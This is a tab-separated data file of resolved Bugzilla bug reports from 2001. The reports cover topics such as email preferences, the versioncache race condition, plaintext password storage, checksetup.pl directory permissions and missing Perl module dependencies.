72837%TAB%985165971%TAB%9911%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Administration%TAB%Bugzilla should produce JS version of Components/Products etc.%TAB%Bugzilla should produce JS version of Components/Products etc.We have continual trouble updating the Bugzilla Helper to keep in sync with  component changes - the results of falling behind are scary messages about  "database corruption". What we really need is for Bugzilla to generate a .js  file with data structures in to hold this information. This could then be used  by the Bugzilla query form and things like Bugzilla Helper.  The query form already has something like this in it; splitting them off into a  separate file shouldn't be too hard. Filing this bug to keep track of the idea,  but it's probably 2.16 at the earliest. :-
72862%TAB%985174071%TAB%15223%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%<q src="tinderbox" class="warning,orange">globals.pl uses relationset requires globals.pl</q>%TAB%<q src="tinderbox" class="warning,orange">globals.pl uses relationset requires globals.pl</q>I think this is the problem both bugzilla tinderboxes are orange due to compilation warnings in  globals.pl.  globals.pl uses relationset, and relationset.pm requires globals.pl globals.pl is not a proper perl module that can be accessed with "use", hence the "requires" hack.  Fix that, and I think this problem should go away.  "requires" is not supposed to load a module if it's already loaded.  Is there  something weird about the way it's being called that causes Perl to think it  hasn't been loaded yet?
72863%TAB%985174115%TAB%15223%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla,Creating/Changing Bugs%TAB%clean processbug output,Remove ugly table shown when posting/changing a bug%TAB%clean processbug output,Remove ugly table shown when posting/changing a buga) Which patch is the current one they were all current, merely a matter of perspective.  i want the first one  for sure, the others are really a, do we want this or that or ... b) Whether it's still relevant i think so c) Whether or not it still applies cleanly (and refresh it if not) *shrug* d) What cross-browser testing you've done on the HTML changes probably mozilla nc4 and maybe ie5. the html changes are safe, there's nothing  fancy involved.
72948%TAB%985203253%TAB%4054%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Mozbot,Query/Bug List%TAB%use OS not platform when giving bug summary,default column list should include OS and not Platform%TAB%use OS not platform when giving bug summary,default column list should include OS and not PlatformWould it make sense to change the default bugzilla collumn from Platform to OS?
73180%TAB%985315453%TAB%4412%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%versioncache should say it's not editable.%TAB%versioncache should say it's not editable.nstead of just saying it's automatically generated, how about saying what  generates it?  "This file is automatically generated once per hour by the  GenerateVersionTable() routine in globals.pl".  This way if some enterprising  soul like the reporter on bug 47943 would know where he has to go to fix it up if  they really want to do the fixing anyway.  Matthew Tuck [:CodeMachine] Assignee
73249%TAB%985352822%TAB%15223%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%main::sendEmail() called too early <q class="bugzilla,warning" src="tinderbox"/>%TAB%main::sendEmail() called too early <q class="bugzilla,warning" src="tinderbox"/>Running /usr/bonsaitools/bin/perl -cwT  -I/home/httpd/cgi-bin/mozilla/webtools/bugzilla/ mysqld-watcher.pl; Results: mysqld-watcher.pl has compilable perl syntax. Warnings:  main::sendEmail() called too early to check prototype at         /home/httpd/cgi-bin/mozilla/webtools/bugzilla/mysqld-watcher.pl line 79
73330%TAB%985442320%TAB%11608%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla,Email%TAB%too much space at top of bugmail%TAB%too much space at top of bugmailIf someone adds comments to a bug but doesn't change any other fields, the  bugmail I get has five blank lines between the bug URL and the "additional  comments" line.  That forces me to scroll down just to see who made the  change.  IMO, there should just be one blank line.
73502%TAB%985612328%TAB%11219%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Creating/Changing Bugs%TAB%midair collision checks don't cover other bugs changing dependancies%TAB%midair collision checks don't cover other bugs changing dependanciesWhile I was editing bug 73447, darin added that bug as a dependancy of bug 73293. I then committed the changes to bug 73447, and the dependancy got overwritten without warning - the first I knew about it was when the process_bug page listed mail sent to people about other bugs, and when I got the email from both bugs.
73665%TAB%985694891%TAB%4897%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla,Bugzilla-General%TAB%Need an "emailprefs" table,Create an "emailprefs" table%TAB%Need an "emailprefs" table,Create an "emailprefs" tableCurrently, the e-mail filtering prefs are all stored in a field in the profiles table called "emailflags" and seperated by tildes (~).  As discussed in IRC, this should really be stored in a table of it own.    My basic thinking is that this should gave two columns, event and value (generic names, nothing in stone).  Event would be what we currently have w/emailOwnerRemoveme and value would be "1" for filtered.  Notice that having the value 1 makes it filtered (nomail).  If there is now emailOwnerRemoveme for a particular user, it should default to sending mail (the checkbox is checked in editprefs.cgi).  While this logic may seem backwards, it allows the amount of data stored to be much smaller (an entry in the table is only created if a user doesn't want mail, if the later decide they do want mail on that type of change, simply remove the row from the table).
73959%TAB%985850182%TAB%4897%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla,User Interface%TAB%My Votes doesn't show up on buglist.cgi,My Votes doesn't show up on buglist.cgi or attachment.cgi%TAB%My Votes doesn't show up on buglist.cgi,My Votes doesn't show up on buglist.cgi or attachment.cgiThe link to My Votes in the page footer does not show up on the buglist.cgi page. This is caused by the fact that: if (!defined $::anyvotesallowed) {     GetVersionTable(); }  Occurs *after*: if ($::anyvotesallowed) {     $html .= " | <A HREF=\"showvotes.cgi\">My votes</A>"; }  in CGI.pl's GetCommandMenu().  Patch forthcoming.
74032%TAB%985873623%TAB%27134%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%Password stored in plaintext on the MySQL Data Base.%TAB%Password stored in plaintext on the MySQL Data Base.System administrators at my site are concerned about my running bugzilla in one  of their machines since users tend to use the same password for bugzilla and  for their login account in the other machines. This password being plaintext in  the DB mekes it available to the bugzilla admin (me) at any time.  Password should be only stored in it's encrypted form on the DB.
74355%TAB%986160738%TAB%11608%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla,User Interface%TAB%[rfe] bug title in tooltip for full-url buglinks,Set tooltip to bug title for full-url buglinks%TAB%[rfe] bug title in tooltip for full-url buglinks,Set tooltip to bug title for full-url buglinksAll of these should get tooltips, but the last one doesn't:
74394%TAB%986200059%TAB%21302%TAB%VERIFIED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%editmilestones.cgi can't edit the name and sortkey at the same time%TAB%editmilestones.cgi can't edit the name and sortkey at the same timeAt present, if you use editmilestones to change the milestone and the sort key  at the same time, it changes the milestone name, but leaves the sort key  unchanged. This is because it uses the original milestone name in the query  after it has already updated it to the new name.  Patch (to be attached) causes it to update the sort key _before_ the milestone  name, such that both can be updated simultaneously.
74529%TAB%986271274%TAB%4897%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%Problem with bugmail.,Problem with bugmail filtering%TAB%Problem with bugmail.,Problem with bugmail filteringYikes.  There was a slight logic error in the last checkin to processmail (bug 71798).  Basically, a missing ! is causing some bugmail to be supressed.
75176%TAB%986733144%TAB%13272%TAB%VERIFIED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Creating/Changing Bugs,attachment and request management%TAB%marking attachments as "obsolete"%TAB%marking attachments as "obsolete"This is similar to bug 44595 "[RFE] Need ability to edit/delete attachments". While that bug affects the attachment content, this bug mainly adds new information to the database that makes it possible to hide "obsolete" attachments. (Deletion of obsolete attachments could then be implemented later.)  Proposal: - If a bug has any attachments, there should be an additional link near "Create a new attachment" named "Manage existing attachments" (or perhaps "Change" or "Edit" instead of "Manage"). - Clicking on this link should describe the current possibilities to change attachments and display a list of all attachments with a checkbox next to each, similar to the "My Bugs" page (showvotes.cgi). A checked checkbox would mean the attachment is marked "obsolete". - Everyone with "can edit all bugs" permission should be able to toggle the "obsolete" switch and submit the change. The submitter of an attachment should have that permission, too. - In a bug view, only non-obsolete attachments should be shown by default. If there are obsolete attachments for a bug, an additional link should appear to show obsolete attachments, too. But even on that "all attachments" list, obsolete attachments should appear visually different from non-obsolete attachments. This could be done by applying a "strike-through" style to obsolete attachments. For a quick start, this page could be the same as the "Manage attachments" page. - Links like this: "attachment 1234 [details]" should have strike-through style iff the attachment is obsolete.  Implementing this would require an additional field to be added to the attachments table: attachment.isobsolete, probably similar to attachment.ispatch
75349%TAB%986848629%TAB%13781%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla Helper,Bugzilla-General%TAB%Javascript error in Helper%TAB%Javascript error in HelperJavaScript Error: http://www.mozilla.org/quality/help/bugreport.js, line 90:  try is a reserved identifier.               try { ............^  JavaScript Error: http://www.mozilla.org/quality/help/bugzilla-helper.html, line 7:  PrefillBugInfoForm is not defined.  JavaScript Error: http://www.mozilla.org/quality/help/bugzilla-helper.html, line 765:  OpenEnterBugPage is not defined.  JavaScript Error: http://www.mozilla.org/quality/help/bugzilla-helper.html, line 765:  OpenEnterBugPage is not defined.  JavaScript Error: http://www.mozilla.org/quality/help/bugzilla-helper.html, line 765:  OpenEnterBugPage is not defined.
75482%TAB%986918004%TAB%27300%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla,Bugzilla-General%TAB%RFE: deactivate groups and prevent bugs being added to them%TAB%RFE: deactivate groups and prevent bugs being added to themThere are situations in which a Bugzilla installation may want to "close out" a bug group over time rather than immediately by making it possible for users to continue working on bugs in the group without giving them the ability to extend the life of the group by adding new bugs to it.  Since access to the bugs should remain restricted, releasing the bugs back into the wild and deleting the group is not an option.  One solution is to add a column to the "groups" table that records whether or not a group is active.  An active group can be used in the same way groups are used in Bugzilla today.  An inactive group, on the other hand, has certain restrictions on how it can be used that are intended to discourage further use of the group.  In particular, it is not possible to add bugs to an inactive group.  There may also be other restrictions on that group.  I have created a patch that adds UI to the "Edit Groups" screen for de/activating groups and hides the UI in the "Edit Bug" screen for adding a bug to an inactive group.  The following SQL command adds the appropriate column to the "groups" table, and I will attach a patch with my changes to bug_form.pl and editgroups.pl:  ALTER TABLE groups ADD COLUMN isactive TINYINT NOT NULL DEFAULT 1;  -myk
75488%TAB%986921274%TAB%15368%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%[meta] Bufzilla needs a perf speedup,[meta] Bugzilla needs a performance speedup%TAB%[meta] Bufzilla needs a perf speedup,[meta] Bugzilla needs a performance speedupWhile mysql's speed is a fiven (portinf is a different thinf), the cfi scripts  could be speedup. This meta buf is intended to track measures that  could be done to speed up bufzilla.
75840%TAB%987090648%TAB%4415%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%syncshadowdb needs to be more flexible%TAB%syncshadowdb needs to be more flexiblesome improvements i'd like to make to syncshadowdb. i'm adding these as  command line options.  mysqldump's for mozilla.org's database are collosal and need to be stored on a different filesystem from where the bug database lives. make the location of the tmp file be configurable.  bugzilla.mozilla.org is completely unusable anyway during a mysqldump. I'd like syncshadowdb to turn off bugzilla during this process.  Doing a mysqldump is a lenghy process and our nightly backup process does two of them. The first one is done by the process that recreates the shadowdb and then a second mysqldump command is issued which creates the dump file that is actually used. I'd like to be able  to disable the automatic  deletion of the dump created by syncshadowdb and use that file as the  backup.  going to attach a patch that implement the first two items.
76029%TAB%987215545%TAB%27630%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla 3,Bugzilla,Documentation%TAB%http://bugzilla.mozilla.org/12345 should get bug 12345%TAB%http://bugzilla.mozilla.org/12345 should get bug 12345This is the way the debian bug system works (bugs.debian.org) and it would be very nice to have in bugzilla, to make going to a particular bug more convenient.
76073%TAB%987275456%TAB%11608%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%quicksearch: + prefix doesn't work,quicksearch: + prefix doesn't work in IE or opera,quicksearch: + and - prefixes doesn't work in IE or opera%TAB%quicksearch: + prefix doesn't work,quicksearch: + prefix doesn't work in IE or opera,quicksearch: + and - prefixes doesn't work in IE or opera+ is ignored as a quicksearch prefix ("+foo" searches for bugs with "+foo" in  product, summary, etc).  According to the documentation, it's supposed to  search in only the summary field.  Btw, the documentation gives an example of "+brow  does not find all bugs in  the  Browser  product".  This is confusing, because the example says what  doesn't happen without saying what does happen.  I think the example should be  replaced with 'For example, use "+news" to find bugs with "news" in the summary  without also finding all bugs in the MailNews product'.)
76154%TAB%987398747%TAB%4412%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%.htaccess files%TAB%.htaccess filesFor Bugzilla 2.12 we documented the files that admins have to deny access to.  For 2.14 we should ship .htaccess files for web servers that support them (just Apache?)  This should probably be one of the last bugs we complete before shipping 2.14.   There's other bugs pending which will change the definitions of what needs to be  blocked.  (shadow/ is gone, data/comments no longer needs to be accessible by the  webserver, etc)
76156%TAB%987399362%TAB%4412%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%Securing Bugzilla section omits shadow directory.%TAB%Securing Bugzilla section omits shadow directory.While the Securing Bugzilla section does talk about securing the shadow directory, it is missing in this sentence:  Ensure you have adequate access controls for $BUGZILLA_HOME/data/ and $BUGZILLA_HOME/localconfig. The localconfig file stores your "bugs" user password, which would be terrible to have in the hands of a criminal. Also some files under $BUGZILLA_HOME/data store sensitive information.
76157%TAB%987400384%TAB%4412%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Administration%TAB%Give proper error message on non-numeric sortkey.%TAB%Give proper error message on non-numeric sortkey.If I try to add or edit a milestone such that the sortkey is not a number, I get an error like:  INSERT INTO milestones ( value, product, sortkey ) VALUES ( 'A','TestProduct', K): Unknown column 'K' in 'field list' at globals.pl line 173.   This should check the sortkey is a number and give a reasonable error message if not.  This might be a security problem but I can't figure out how to might make it one.
76161%TAB%987401627%TAB%4412%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Query/Bug List%TAB%Don't marking resolving duplicate when exiting empty dupe field.,Don't select "resolve as dup" radio button when exiting empty dupe field.%TAB%Don't marking resolving duplicate when exiting empty dupe field.,Don't select "resolve as dup" radio button when exiting empty dupe field.There is currently code so that when I exit the "Resolve this bug as dupe of [    ] field", the radio button for this line gets checked.  I unchecked it, and then when back and removed the number just to be sure.  Then when I exited it selected the line again.  It should only do this when there is something in the field.
76183%TAB%987407163%TAB%4412%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%checksetup.pl updates data permissions in two places.%TAB%checksetup.pl updates data permissions in two places.There are two places on checksetup.pl where permissions are updated for data.  The first only occurs when creating data:  unless (-d 'data') {     print "Creating data directory ...\n";     mkdir 'data', 0770;     if ($my_webservergroup eq "") {         chmod 0777, 'data';     }     open FILE, '>>data/comments'; close FILE;     open FILE, '>>data/nomail'; close FILE;     open FILE, '>>data/mail'; close FILE;     chmod 0666, glob('data/*'); }  and the second one occurs later, when the web server group is defined:      chmod 0770, 'data', 'shadow', 'graphs';     chmod 0666, glob('data/*');     chmod 0777, glob('data/*/'); # directories stay executable  Why not reconcile these?  The first bit should just create the directory, and the second bit should set up the permissions whether or not the web server group is set (in the way data is set in the first bit).  Also, there is also similar code for creating graphs, but it is even further down when I think it should be above the second code bit above and maybe near the first code bit:  unless (-d 'graphs') {     print "Creating graphs directory...\n";     mkdir 'graphs', 0770;      if ($my_webservergroup eq "") {         chmod 0777, 'graphs';     }       ...  If it is important that graphs be after certain things above it, perhaps permissions should be the last thing done.
76261%TAB%987436659%TAB%4415%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%checksetup.pl should set sticky bit set on /opt/webtools/bugzilla/graph,checksetup.pl should set sticky bit on ${BZ_HOME}/graphs%TAB%checksetup.pl should set sticky bit set on /opt/webtools/bugzilla/graph,checksetup.pl should set sticky bit on ${BZ_HOME}/graphsChart::Base in perl 5.6 requires sticky bit set on /opt/webtools/bugzilla/graph because the directory is world writable.  reports.cgi doesn't work with perl 5.6 because of this problem and throws some odd looking errors that don't seem to have anything to do with  directory permissions.  to work around the problem do this: chmod 1777 /opt/webtools/bugzilla/graph
76484%TAB%987574214%TAB%13272%TAB%VERIFIED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Query/Bug List%TAB%Allow multiple QuickSearch forms in a single document%TAB%Allow multiple QuickSearch forms in a single documentThe QuickSearch documentation should be able to present examples the same way Google does, so that the user can modify them and/or submit them directly from the documentation page. See http://www.google.com/help/basics.html and http://www.google.com/help/refinesearch.html for example pages.  For this to work, it must be possible to have multiple QuickSearch forms in a single document. This is currently impossible because the functions in quicksearch.js don't take any arguments, they read the value from a hardcoded location instead (document.f.id.value or something like this). This has to be changed so that  	a) the value or	b) the textbox form element or	c) the form itself  is passed as an argument to the JS function. - a) and b) are very similar; the only difference is that  - An advantage of c) is that the interface would not need to be changed in case QuickSearch is extended by additional, optional form elements (radio buttons, checkboxes, ...), so that quicksearch.js could support these new elements but still be backwards compatible. - A disadvantage of c) is that name="id" for the textbox would still have to be hardcoded.  Feel free to take this one if you like. Currently I have no time, but maybe in two weeks...
76507%TAB%987580561%TAB%4412%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,User Interface%TAB%Assignee or owner?%TAB%Assignee or owner?I commented on the fact that Tara is called the Bugzilla "owner" on the web page and asked just what an owner of a piece of software is meant to be.  I thought it was trying to get at "project leader" but Dave said it was more like "default assignee for the Bugzilla component", which had never occurred to me.  It was not suprising to me therefore that the bug page uses the wording "assignee".  However, inconsistently "owner" appears on editcomponents.cgi on the components table (editcomponents.cgi?product=XXX) and on the specific component form (editcomponents.cgi?product=XXX&component=YYY&action=edit).  I'm not concerned with the schema, and I'm not sure about any other pages.  So basically, we should make this consistent.  I suggest assignee is a better term since it is less ambiguous, at least when used outside the context of Bugzilla like it was on the web page.
76524%TAB%987588642%TAB%4412%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%mostfreqhtml fix.%TAB%mostfreqhtml fix.I changed the query page link to be relative so it would work for other installations.  And I also fixed the Bugzilla Helper link which was broken.  As much as I dislike leaving that line in because it is b.m.o specific, it looks like editparams is too infested with them to deal with them easily.
76639%TAB%987638129%TAB%4412%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Installation%TAB%Maintainer should be automatically set.%TAB%Maintainer should be automatically set.The maintainer field on editparams.cgi should be set by checksetup.pl from the email account of the first account created by it.  This will be a nice trick, since checksetup.pl has no access to the Params unless  we duplicate a whole mess of code.  I agree it's a good idea though.  Hmm, on second thought, assuming that data/params doesn't exist yet, a very  simplified data/params could probably be written out that contained only the  maintainer param.  The rest of the params would be picked up from defparams.pl  the next time it tries to reference a param that hasn't been defined yet.
76714%TAB%987675187%TAB%27300%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla,User Interface%TAB%incorrectly nested FORM and TABLE tags in command menu%TAB%incorrectly nested FORM and TABLE tags in command menuThe command menu that appears at the bottom of most Bugzilla pages contains incorrectly nested </form> and </table> tags as well as extraneous <tr> and </tr> tags.  This bug may cause form data to be lost when returning to a cached Bugzilla page (bug 74639).
76837%TAB%987727126%TAB%4412%TAB%RESOLVED%TAB%FIXED%TAB%Testing%TAB%Bugzilla,Bugzilla-General%TAB%queryhelp.cgi is b.m.o specific.%TAB%queryhelp.cgi is b.m.o specific.Currently queryhelp.cgi contains numerous references to the bugzilla.mozilla.org installation.  I don't think we should release it as is.
76862%TAB%987751015%TAB%4412%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%mysqlwatcher.pl is not executable.%TAB%mysqlwatcher.pl is not executable.mysqldwatcher.pl should be added to the executable files in checksetup.pl, or moved to contrib.
76923%TAB%987770542%TAB%15368%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Creating/Changing Bugs%TAB%Don't do diagnostics and warnings unless wanted,Don't |use diagnostics;|%TAB%Don't do diagnostics and warnings unless wanted,Don't |use diagnostics;|This gives us at least a 5% speedup on show_bug.cgi! Modperl is all good and fine (note that the patch doesn't quite work yet...),  but it requires lots of work to set it up on the installation end. I would rather  try to eerk out all the proformence I can from the actual perl scripts (where  we spend 10% of the time in show_bug.cgi doing warnings and  diagnostics) than going through gross hacks that most people won't take  the time and effort to use. If you are interested in working on this, you are  welcome to file a bug assigned to you that blocks the meta 
77107%TAB%987934179%TAB%4412%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Documentation%TAB%Docs should refer to our bug writing guidelines.,Docs should include our bug writing guidelines.%TAB%Docs should refer to our bug writing guidelines.,Docs should include our bug writing guidelines.In the section 4.3.3.1. Writing a Great Bug Report, it refers to the mozilla.org bug writing guidelines.  However, we already ship with a set of bug writing guidelines.  We should refer to that instead.
77192%TAB%988016856%TAB%4412%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla,Query/Bug List%TAB%MOVED is not handled properly on queryhelp.cgi.%TAB%MOVED is not handled properly on queryhelp.cgi.MOVED appears as a resolution in the combo boxes on all installations.  It  should only appear when moving is turned on (although what if it is turned off  and old reports still have it?).  A description for MOVED does not appear at all.  Like the above it should  appear if and only if moving is on.
77193%TAB%988017053%TAB%4412%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla,Administration%TAB%Old version detection.,Retire old versions and milestones.,Retire old versions, components and milestones.,Add the ability to retire (disable) old versions, components and milestones%TAB%Old version detection.,Retire old versions and milestones.,Retire old versions, components and milestones.,Add the ability to retire (disable) old versions, components and milestones
77473%TAB%988131848%TAB%22500%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla 3,Bugzilla,Bugzilla-General%TAB%mysql's encrypt is not DB independent%TAB%mysql's encrypt is not DB independentBy having the code use the builtin mysql encrypt function, one can't port the code to other DBs (my goal).  This might also help other OS's.  [patch to be attached]  Retargetting for Bugzilla 3.  CCing barnboy to add a reference to this patch to the docs for people installing  on NT and the like.  This won't make 2.x for one simple reason: mySQL on many systems uses a different  crypt method than Perl does.  If you're on one of these systems, the passwords  crypted with Perl won't necessarily match the passwords crypted with mySQL, and  thus by installing this patch, you're immediately forcing everyone on your system  to have their password reset.  Bugzilla doesn't do it for you, either.  It just  mails you your existing password from the plaintext version that's right next to  it in the database.  Except now it doesn't match so they still can't get in.  The  admin would have to go reset them for everyone.  In principle, I think it's great, and it should have been done this way to begin  with, but changing it now will cause too much damage to existing systems.
77697%TAB%988258382%TAB%19321%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla: Other moz.org Issues,Bugzilla Helper,Bugzilla-General%TAB%bugzilla-helper doesnt include PSM in components%TAB%bugzilla-helper doesnt include PSM in componentsUnder Step 3 "Gather information", bugzilla-helper doesnt include PSM in the dropdown box to select a component to report a bug on.  The closest option (Security: Crypto) doesnt seem quite right, and according to that form, has only one bug assigned to that component anyway.  PSM should be in that list.  Comparing the components available there with the ones on the advanced bug form , a few other components may be missing too.
77699%TAB%988258754%TAB%21302%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%javascript error in quicksearch.js%TAB%javascript error in quicksearch.jsI expect this is a browser bug rather than a problem with quicksearch.js, as it  works on a different machine with windows 2000 and IE 5.5, but I don't know  enough about javascript to be sure, and quicksearch.js may be able to work  around it anyway.  I'm using Internet Explorer 5 on a windows NT machine. User Agent: Mozilla/4.0 (compatible; MSIE 5.0; Windows NT; DigExt)  If I go to the main index page, either on our local bugzilla installation  (2.12), or the main bugzilla site (2.11), and type (e.g.) "bugzilla  quicksearch" into the quicksearch box, it says:  Line: 605  Char: 5  Error: 'undefined' is undefined  Code: 0  URL: http://bugzilla.mozilla.org/  If I OK the error, it goes to http://bugzilla.mozilla.org/show_bug.cgi?id=bugzilla+quicksearch and offers to search by bug number.  It works fine (no error) if I type a bug number in instead of search terms.
77771%TAB%988285004%TAB%6793%TAB%VERIFIED%TAB%FIXED%TAB%Development%TAB%Bugzilla Helper,Bugzilla-General%TAB%Bugzilla Helper creates "http://http://" URLs%TAB%Bugzilla Helper creates "http://http://" URLsif you enter "http://gemal.dk" in the URL field on the Bugzilla Helper the URL  on the Enter Bug page becomes "http://http://gemal.dk"  I'm not sure about the version of Bugzilla Helper since it doesn't  say "version" anywhere...
77778%TAB%988285974%TAB%3794%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%Stuttering in list of components, etc.%TAB%Stuttering in list of components, etc.Bugzilla has had a long time, very-hard-to-reproduce problem where occasionally all the entries in the versions and components and other selection lists would get duplicated: each component would be listed twice, etc.  Everyone knew that this was because the versioncache file was getting corrupted, but nobody knew how.  Well, I happened to be staring at some code, and I think I found out how.  If a .cgi calls GetVersionTable() more than once and if it has been exactly one hour since the versioncache file was last created, then this problem can result.  The first time it gets called, it decides that the existing file is recent enough it loads the data from the versioncache file.  The second time, the clock has ticked over one second and so it now decides the versioncache file is out-of-date.  So, it goes to regenerate it.  Well, all the regeneration code assumes that the variables start out empty, so it is going to append new data to the end of the existing data in memory from the first time it loaded.  Oops.  GetVersionTable() needs to be patched to do nothing if it has been called already.
78044%TAB%988452881%TAB%4897%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%"install Msql-Mysql" in CPAN no longer works%TAB%"install Msql-Mysql" in CPAN no longer worksI was just doing a new Bugzilla install and discovered that Msql-Mysql seems to have been replaced with Bundle::Mysql.  This needs to be changed in the docs, checksetup.pl (where it tells you how to install the MySQL modules), and possible Bundle::Bugzilla.  I don't know for sure about Bundle::Bugzilla because I had given up on using it due to the fact that it wanted me to install perl 5.6.1 (I since discovered that Data::Dumper seems to be what wanted to force the 5.6.1 upgrade)
78045%TAB%988453146%TAB%4897%TAB%RESOLVED%TAB%FIXED%TAB%Testing%TAB%Bugzilla,Bugzilla-General%TAB%checksetup.pl says to consult the README file%TAB%checksetup.pl says to consult the README fileIf checksetup can't access the "bugs" database, it says to consult the README file.  However, the information wanted is no longer in README, it's in the Installation Docs.  I can't test the above, because I can't work out how to get those errors to output.  When MySQL is not running I get an unhelpful error message.
78276%TAB%988642177%TAB%27300%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla: Other b.m.o Issues,Installation & Upgrading%TAB%change name of "when" index on bugs_activity.bug_when column%TAB%change name of "when" index on bugs_activity.bug_when columnThe BugZilla database has an index called "when" which indexes the "bug_when" column of the "bugs_activity" table.  This appears to be a relic of an old naming scheme on b.m.o, since that index is called "bug_when" in new Bugzilla installations.  "When" is a reserved keyword in MySQL, but it is not quoted in the nightly backup file, so importing that file into MySQL fails with a syntax error.  This means that if we ever need to use our backup file we aren't going to be able to do so unless we edit it, which is non-trivial on a file greater than 800MB in size.  Therefore this index needs to be renamed from "when" to some other name that isn't a MySQL reserved word, like "bug_when".
78339%TAB%988692012%TAB%15661%TAB%VERIFIED%TAB%FIXED%TAB%Testing%TAB%Bugzilla Helper,Bugzilla-General%TAB%Bugzilla thinks 2001043020 is older than 3 weeks%TAB%Bugzilla thinks 2001043020 is older than 3 weeksWhen I tried to report a bug today using Bugzilla Helper, I got a message saying that my nightly build of April 30th was older than 3 weeks. As today is May 1st this is obviously not correct.
78407%TAB%988718946%TAB%28203%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%processmail/filterExcludeList possibly over happily deletes%TAB%processmail/filterExcludeList possibly over happily deletesIt seems to me that there needs to be a 'last;' after the 'pop(@result)' on/near line 623.  Otherwise, if @allEmail has two instances of the offending email (perhaps not allowed elsewhere, tho) you would overpop @result, discarding  valid email(s).
78408%TAB%988719065%TAB%28203%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%bug update exclude emails include ARRAY(0x....)%TAB%bug update exclude emails include ARRAY(0x....)specifically, it happens at line 563 of processmail/bugzilla 2.12:          my @personlist = ($values{'assigned_to'}, $values{'reporter'},                           split(/,/, $values{'cc'}),                           @voterlist, -->                       $force{'CClist'});  the line should be '@{$force{'CClist'}});' ... like $force{'CClist'} is every place else in the file.  Um, no $Id$ lines in the file?
79317%TAB%989263761%TAB%14831%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%checksetup.pl dependency on CGI::Carp%TAB%checksetup.pl dependency on CGI::CarpDave, I hope you don't mind me assigning this to you intially -- if you think it's in Tara's or Cyeh's department or something, take it away : )  We have an undocumented dependency on CGI::Carp in Checksetup.pl. I am documenting this for the next release of the Bugzilla Guide.  This bug, however, I'm filing for someone to fix checksetup.pl so that it checks for the presence of CGI::Carp before executing (rather than dumping with an Unhandled Exception).  Here's a copy of the email I sent to the newsgroup:  I'm going to file a bug on this in a few minutes...  I'm running through my install docs and noted this bug in checksetup.pl on a  vanilla install of Linux-Mandrake 8.0.  Unfortunately, I do not have "CGI::Carp" in the documentation as a  prerequisite; I believe the assumption was that it was always installed with  Perl -- but that ain't the case with Mandrake 8.0 and Perl 5.6.0.  Anybody  feel like hacking checksetup.pl to mark this as a dependency, while I get  this prerequisite listed in the documentation?  I've verified this fixes the problem: bash# perl -MCPAN -e 'install "CGI::Carp"'  However, this needs to be documented (my responsibility, I'm working on it)  and fixed in checksetup.pl so that it checks for the presence of this module  (not my job, but I'll do it if nobody else wants to).  Thanks!   Uncaught exception from user code:         Uncaught exception from user code:         Uncaught exception from user code:         Uncaught exception from user code:         Can't locate CGI/Carp.pm in @INC (@INC contains:  